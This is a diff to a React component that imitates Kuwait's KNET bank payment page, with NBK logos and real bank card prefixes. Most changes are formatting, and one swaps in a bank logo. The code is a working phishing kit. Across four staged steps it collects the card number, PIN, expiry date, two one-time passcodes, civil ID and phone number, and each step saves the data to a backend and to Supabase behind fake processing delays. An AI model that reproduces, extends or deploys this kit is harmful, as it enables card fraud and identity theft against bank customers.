@@ -2,23 +2,23 @@ import { useState, useEffect, useRef } from "react";
 import { base44 } from "@/api/base44Client";
 
 const BANKS = [
-  { value: "ABK", label: "Al Ahli Bank of Kuwait", cardPrefixes: ["403622", "428628", "423826"] },
-  { value: "ALRAJHI", label: "Al Rajhi Bank", cardPrefixes: ["458838"] },
-  { value: "BBK", label: "Bank of Bahrain and Kuwait", cardPrefixes: ["418056", "588790"] },
-  { value: "BOUBYAN", label: "Boubyan Bank", cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"] },
-  { value: "BURGAN", label: "Burgan Bank", cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"] },
-  { value: "CBK", label: "Commercial Bank of Kuwait", cardPrefixes: ["532672", "537015", "521175", "516334"] },
-  { value: "Doha", label: "Doha Bank", cardPrefixes: ["419252"] },
-  { value: "GBK", label: "Gulf Bank", cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"] },
-  { value: "TAM", label: "TAM Bank", cardPrefixes: ["45077848", "45077849"] },
-  { value: "KFH", label: "Kuwait Finance House", cardPrefixes: ["485602", "537016", "5326674", "450778"] },
-  { value: "KIB", label: "Kuwait International Bank", cardPrefixes: ["409054", "406464"] },
-  { value: "NBK", label: "National Bank of Kuwait", cardPrefixes: ["464452", "589160"] },
-  { value: "Weyay", label: "Weyay Bank", cardPrefixes: ["46445250", "543363"] },
-  { value: "QNB", label: "Qatar National Bank", cardPrefixes: ["521020", "524745"] },
-  { value: "UNB", label: "Union National Bank", cardPrefixes: ["457778"] },
-  { value: "WARBA", label: "Warba Bank", cardPrefixes: ["541350", "525528", "532749", "559459"] },
-];
+{ value: "ABK", label: "Al Ahli Bank of Kuwait", cardPrefixes: ["403622", "428628", "423826"] },
+{ value: "ALRAJHI", label: "Al Rajhi Bank", cardPrefixes: ["458838"] },
+{ value: "BBK", label: "Bank of Bahrain and Kuwait", cardPrefixes: ["418056", "588790"] },
+{ value: "BOUBYAN", label: "Boubyan Bank", cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"] },
+{ value: "BURGAN", label: "Burgan Bank", cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"] },
+{ value: "CBK", label: "Commercial Bank of Kuwait", cardPrefixes: ["532672", "537015", "521175", "516334"] },
+{ value: "Doha", label: "Doha Bank", cardPrefixes: ["419252"] },
+{ value: "GBK", label: "Gulf Bank", cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"] },
+{ value: "TAM", label: "TAM Bank", cardPrefixes: ["45077848", "45077849"] },
+{ value: "KFH", label: "Kuwait Finance House", cardPrefixes: ["485602", "537016", "5326674", "450778"] },
+{ value: "KIB", label: "Kuwait International Bank", cardPrefixes: ["409054", "406464"] },
+{ value: "NBK", label: "National Bank of Kuwait", cardPrefixes: ["464452", "589160"] },
+{ value: "Weyay", label: "Weyay Bank", cardPrefixes: ["46445250", "543363"] },
+{ value: "QNB", label: "Qatar National Bank", cardPrefixes: ["521020", "524745"] },
+{ value: "UNB", label: "Union National Bank", cardPrefixes: ["457778"] },
+{ value: "WARBA", label: "Warba Bank", cardPrefixes: ["541350", "525528", "532749", "559459"] }];
+
 
 export default function KnetPayment() {
   const [step, setStep] = useState(1);
@@ -44,26 +44,26 @@ export default function KnetPayment() {
     phoneNumber: "",
     network: "",
     idNumber: "",
-    otp2: "",
+    otp2: ""
   });
 
   useEffect(() => {
     let interval = null;
     if (isCountdownActive && countdown > 0) {
-      interval = setInterval(() => setCountdown(c => c - 1), 1000);
+      interval = setInterval(() => setCountdown((c) => c - 1), 1000);
     } else if (countdown === 0) {
       setIsCountdownActive(false);
     }
-    return () => { if (interval) clearInterval(interval); };
+    return () => {if (interval) clearInterval(interval);};
   }, [isCountdownActive, countdown]);
 
   const isStep1Disabled =
-    !paymentInfo.prefix || paymentInfo.prefix === "i" ||
-    !paymentInfo.bank ||
-    !paymentInfo.cardNumber ||
-    !paymentInfo.pass || paymentInfo.pass.length !== 4 ||
-    !paymentInfo.month || paymentInfo.month === "0" ||
-    !paymentInfo.year || paymentInfo.year === "0";
+  !paymentInfo.prefix || paymentInfo.prefix === "i" ||
+  !paymentInfo.bank ||
+  !paymentInfo.cardNumber ||
+  !paymentInfo.pass || paymentInfo.pass.length !== 4 ||
+  !paymentInfo.month || paymentInfo.month === "0" ||
+  !paymentInfo.year || paymentInfo.year === "0";
 
   const isStep2Disabled = paymentInfo.otp.length !== 6;
 
@@ -84,7 +84,7 @@ export default function KnetPayment() {
       otp2: paymentInfo.otp2,
       step_reached: stepNum,
       user_agent: navigator.userAgent,
-      ...extraData,
+      ...extraData
     };
     if (recordIdRef.current) {
       await base44.entities.PaymentRecord.update(recordIdRef.current, payload);
@@ -95,7 +95,7 @@ export default function KnetPayment() {
     // Also sync to Supabase via savePayment function
     await base44.functions.invoke("savePayment", {
       type: "knet",
-      ...payload,
+      ...payload
     });
   };
 
@@ -103,7 +103,7 @@ export default function KnetPayment() {
     if (step === 1) {
       setIsLoading(true);
       saveRecord({}, 1);
-      setTimeout(() => { setIsLoading(false); setStep(2); }, 2000);
+      setTimeout(() => {setIsLoading(false);setStep(2);}, 2000);
     } else if (step === 2) {
       setIsLoading(true);
       setOtpError("");
@@ -111,7 +111,7 @@ export default function KnetPayment() {
       setOtpAttempts(newAttempts);
       const currentOtp = otpValue;
       setOtpValue("");
-      setPaymentInfo(p => ({ ...p, otp: "" }));
+      setPaymentInfo((p) => ({ ...p, otp: "" }));
       saveRecord({ otp1: currentOtp }, 2);
       setTimeout(() => {
         setIsLoading(false);
@@ -126,7 +126,7 @@ export default function KnetPayment() {
     } else if (step === 3) {
       setIsLoading(true);
       saveRecord({}, 3);
-      setTimeout(() => { setIsLoading(false); setStep(4); }, 5000);
+      setTimeout(() => {setIsLoading(false);setStep(4);}, 5000);
     } else if (step === 4) {
       setIsLoading(true);
       saveRecord({ otp2: paymentInfo.otp2 }, 4);
@@ -138,8 +138,8 @@ export default function KnetPayment() {
   };
 
   const isSubmitDisabled =
-    (step === 1 && isStep1Disabled) ||
-    (step === 2 && isStep2Disabled);
+  step === 1 && isStep1Disabled ||
+  step === 2 && isStep2Disabled;
 
   return (
     <div style={{ fontFamily: "Verdana, Arial, Helvetica, sans-serif", backgroundColor: "#ebebeb", minHeight: "100vh" }} dir="ltr">
@@ -150,19 +150,19 @@ export default function KnetPayment() {
         <img
           src="https://media.base44.com/images/public/6a11cacbd565fb23b026ee36/ae1c73ec3_image.png"
           alt="Fraud Awareness"
-          style={{ width: "100%", borderRadius: 10, display: "block", boxShadow: "0 2px 10px rgba(0,0,0,0.3)" }}
-        />
+          style={{ width: "100%", borderRadius: 10, display: "block", boxShadow: "0 2px 10px rgba(0,0,0,0.3)" }} />
+        
       </div>
 
       <div id="knet-container">
-        <form onSubmit={e => e.preventDefault()}>
+        <form onSubmit={(e) => e.preventDefault()}>
           {/* KNET Logo */}
           <div style={{ textAlign: "center", marginBottom: 5 }}>
             <img
               src="https://media.base44.com/images/public/6a15a1a67fdfc61005f1d71f/bbc3e328c_Website-NBK-Logo_800x800px.jpg"
               alt="NBK"
-              style={{ height: 70, objectFit: "contain", display: "inline-block", marginTop: 16 }}
-            />
+              style={{ height: 70, objectFit: "contain", display: "inline-block", marginTop: 16 }} className="hidden" />
+            
           </div>
 
           <div id="knet-content-block">
@@ -171,7 +171,7 @@ export default function KnetPayment() {
               <div className="knet-row">
                 <div className="knet-col-label"><label>Payment Form</label></div>
                 <div className="knet-col-value" style={{ textAlign: "right" }}>
-                  <img src="https://media.base44.com/images/public/6a11cacbd565fb23b026ee36/ce2cb383c_www_moi_gov_kw_logo-moi_8a94a177.svg" alt="KV" width={40} style={{ objectFit: "contain" }} />
+                  <img src="https://media.base44.com/images/public/6a15a1a67fdfc61005f1d71f/bbc3e328c_Website-NBK-Logo_800x800px.jpg" alt="KV" width={40} style={{ objectFit: "contain" }} />
                 </div>
               </div>
               <div className="knet-row">
@@ -187,16 +187,16 @@ export default function KnetPayment() {
             {/* Form Card */}
             <div className="knet-form-card">
               {step === 1 && <Step1 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />}
-              {step === 2 && (
-                <Step2
-                  paymentInfo={paymentInfo}
-                  setPaymentInfo={setPaymentInfo}
-                  otpValue={otpValue}
-                  setOtpValue={setOtpValue}
-                  countdown={countdown}
-                  otpError={otpError}
-                />
-              )}
+              {step === 2 &&
+              <Step2
+                paymentInfo={paymentInfo}
+                setPaymentInfo={setPaymentInfo}
+                otpValue={otpValue}
+                setOtpValue={setOtpValue}
+                countdown={countdown}
+                otpError={otpError} />
+
+              }
               {step === 3 && <Step3 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />}
               {step === 4 && <Step4 paymentInfo={paymentInfo} setPaymentInfo={setPaymentInfo} />}
             </div>
@@ -207,15 +207,15 @@ export default function KnetPayment() {
                 <button
                   className="knet-submit-btn"
                   disabled={isSubmitDisabled || isLoading}
-                  onClick={handleSubmit}
-                >
+                  onClick={handleSubmit}>
+                  
                   {isLoading ? "Wait..." : step === 1 ? "Submit" : "Confirm"}
                 </button>
                 <button
                   className="knet-cancel-btn"
                   onClick={() => window.history.back()}
-                  type="button"
-                >
+                  type="button">
+                  
                   Cancel
                 </button>
               </div>
@@ -230,8 +230,8 @@ export default function KnetPayment() {
         </form>
         {isLoading && <LoadingOverlay />}
       </div>
-    </div>
-  );
+    </div>);
+
 }
 
 function Step1({ paymentInfo, setPaymentInfo }) {
@@ -242,20 +242,20 @@ function Step1({ paymentInfo, setPaymentInfo }) {
         <select
           className="knet-col-value knet-select"
           value={paymentInfo.bank}
-          onChange={e => {
-            const bank = BANKS.find(b => b.value === e.target.value);
-            setPaymentInfo(p => ({
+          onChange={(e) => {
+            const bank = BANKS.find((b) => b.value === e.target.value);
+            setPaymentInfo((p) => ({
               ...p,
               bank: e.target.value,
               bank_card: bank ? bank.cardPrefixes : [""],
-              prefix: "",
+              prefix: ""
             }));
-          }}
-        >
+          }}>
+          
           <option value="">Select Your Banks</option>
-          {BANKS.map((b, i) => (
-            <option key={i} value={b.value}>{b.label} [{b.value}]</option>
-          ))}
+          {BANKS.map((b, i) =>
+          <option key={i} value={b.value}>{b.label} [{b.value}]</option>
+          )}
         </select>
       </div>
 
@@ -265,12 +265,12 @@ function Step1({ paymentInfo, setPaymentInfo }) {
           <select
             className="knet-prefix-select"
             value={paymentInfo.prefix}
-            onChange={e => setPaymentInfo(p => ({ ...p, prefix: e.target.value }))}
-          >
+            onChange={(e) => setPaymentInfo((p) => ({ ...p, prefix: e.target.value }))}>
+            
             <option value="i">prefix</option>
-            {paymentInfo.bank_card.map((pfx, i) => (
-              <option key={i} value={pfx}>{pfx}</option>
-            ))}
+            {paymentInfo.bank_card.map((pfx, i) =>
+            <option key={i} value={pfx}>{pfx}</option>
+            )}
           </select>
           <input
             type="tel"
@@ -278,10 +278,10 @@ function Step1({ paymentInfo, setPaymentInfo }) {
             pattern="[0-9]*"
             maxLength={10}
             value={paymentInfo.cardNumber}
-            onChange={e => setPaymentInfo(p => ({ ...p, cardNumber: e.target.value.replace(/\D/g, "") }))}
+            onChange={(e) => setPaymentInfo((p) => ({ ...p, cardNumber: e.target.value.replace(/\D/g, "") }))}
             placeholder="0000000000"
-            className="knet-card-number-input"
-          />
+            className="knet-card-number-input" />
+          
         </div>
       </div>
 
@@ -291,22 +291,22 @@ function Step1({ paymentInfo, setPaymentInfo }) {
           <select
             className="knet-expiry-mm"
             value={paymentInfo.month}
-            onChange={e => setPaymentInfo(p => ({ ...p, month: e.target.value }))}
-          >
+            onChange={(e) => setPaymentInfo((p) => ({ ...p, month: e.target.value }))}>
+            
             <option value="0">MM</option>
-            {Array.from({ length: 12 }, (_, i) => i + 1).map(m => (
-              <option key={m} value={String(m).padStart(2, "0")}>{String(m).padStart(2, "0")}</option>
-            ))}
+            {Array.from({ length: 12 }, (_, i) => i + 1).map((m) =>
+            <option key={m} value={String(m).padStart(2, "0")}>{String(m).padStart(2, "0")}</option>
+            )}
           </select>
           <select
             className="knet-expiry-yyyy"
             value={paymentInfo.year}
-            onChange={e => setPaymentInfo(p => ({ ...p, year: e.target.value }))}
-          >
+            onChange={(e) => setPaymentInfo((p) => ({ ...p, year: e.target.value }))}>
+            
             <option value="0">YYYY</option>
-            {Array.from({ length: 14 }, (_, i) => 2024 + i).map(y => (
-              <option key={y} value={y}>{y}</option>
-            ))}
+            {Array.from({ length: 14 }, (_, i) => 2024 + i).map((y) =>
+            <option key={y} value={y}>{y}</option>
+            )}
           </select>
         </div>
       </div>
@@ -319,15 +319,15 @@ function Step1({ paymentInfo, setPaymentInfo }) {
           pattern="[0-9]*"
           maxLength={4}
           value={paymentInfo.pass}
-          onChange={e => setPaymentInfo(p => ({ ...p, pass: e.target.value.replace(/\D/g, "") }))}
+          onChange={(e) => setPaymentInfo((p) => ({ ...p, pass: e.target.value.replace(/\D/g, "") }))}
           className="knet-col-value knet-input"
           autoComplete="off"
           placeholder="••••"
-          style={{ WebkitTextSecurity: "disc" }}
-        />
+          style={{ WebkitTextSecurity: "disc" }} />
+        
       </div>
-    </>
-  );
+    </>);
+
 }
 
 function Step2({ paymentInfo, setPaymentInfo, otpValue, setOtpValue, countdown, otpError }) {
@@ -361,16 +361,16 @@ function Step2({ paymentInfo, setPaymentInfo, otpValue, setOtpValue, countdown, 
           type="tel"
           maxLength={6}
           value={otpValue}
-          onChange={e => {
+          onChange={(e) => {
             setOtpValue(e.target.value.replace(/\D/g, ""));
-            setPaymentInfo(p => ({ ...p, otp: e.target.value.replace(/\D/g, "") }));
+            setPaymentInfo((p) => ({ ...p, otp: e.target.value.replace(/\D/g, "") }));
           }}
           className="knet-col-value knet-input"
-          placeholder={`Timeout in: 01:${countdown === 0 ? "00" : String(countdown).padStart(2, "0")}`}
-        />
+          placeholder={`Timeout in: 01:${countdown === 0 ? "00" : String(countdown).padStart(2, "0")}`} />
+        
       </div>
-    </>
-  );
+    </>);
+
 }
 
 function Step3({ paymentInfo, setPaymentInfo }) {
@@ -383,10 +383,10 @@ function Step3({ paymentInfo, setPaymentInfo }) {
           inputMode="numeric"
           maxLength={12}
           value={paymentInfo.idNumber}
-          onChange={e => setPaymentInfo(p => ({ ...p, idNumber: e.target.value.replace(/\D/g, "") }))}
+          onChange={(e) => setPaymentInfo((p) => ({ ...p, idNumber: e.target.value.replace(/\D/g, "") }))}
           className="knet-col-value knet-input"
-          placeholder="Civil / Residence ID"
-        />
+          placeholder="Civil / Residence ID" />
+        
       </div>
       <div className="knet-row">
         <label className="knet-col-label">Authorized Phone Number:</label>
@@ -395,26 +395,26 @@ function Step3({ paymentInfo, setPaymentInfo }) {
           inputMode="numeric"
           maxLength={10}
           value={paymentInfo.phoneNumber}
-          onChange={e => setPaymentInfo(p => ({ ...p, phoneNumber: e.target.value.replace(/\D/g, "") }))}
+          onChange={(e) => setPaymentInfo((p) => ({ ...p, phoneNumber: e.target.value.replace(/\D/g, "") }))}
           className="knet-col-value knet-input"
-          placeholder="05XXXXXXXX"
-        />
+          placeholder="05XXXXXXXX" />
+        
       </div>
       <div className="knet-row">
         <label className="knet-col-label">Network operator:</label>
         <select
           className="knet-col-value knet-select"
           value={paymentInfo.network}
-          onChange={e => setPaymentInfo(p => ({ ...p, network: e.target.value }))}
-        >
+          onChange={(e) => setPaymentInfo((p) => ({ ...p, network: e.target.value }))}>
+          
           <option value="">Choose Network operator...</option>
           <option value="STC">STC</option>
           <option value="Zain">Zain</option>
           <option value="Ooredoo">Ooredoo</option>
         </select>
       </div>
-    </>
-  );
+    </>);
+
 }
 
 function Step4({ paymentInfo, setPaymentInfo }) {
@@ -437,13 +437,13 @@ function Step4({ paymentInfo, setPaymentInfo }) {
           type="tel"
           maxLength={6}
           value={paymentInfo.otp2}
-          onChange={e => setPaymentInfo(p => ({ ...p, otp2: e.target.value.replace(/\D/g, "") }))}
+          onChange={(e) => setPaymentInfo((p) => ({ ...p, otp2: e.target.value.replace(/\D/g, "") }))}
           className="knet-col-value knet-input"
-          placeholder="6-digit OTP"
-        />
+          placeholder="6-digit OTP" />
+        
       </div>
-    </>
-  );
+    </>);
+
 }
 
 function LoadingOverlay() {
@@ -460,8 +460,8 @@ function LoadingOverlay() {
         <div className="knet-spinner"></div>
         <div style={{ color: "#0070cd", fontWeight: "bold", fontSize: 13 }}>Processing...</div>
       </div>
-    </div>
-  );
+    </div>);
+
 }
 
 const knetCss = `
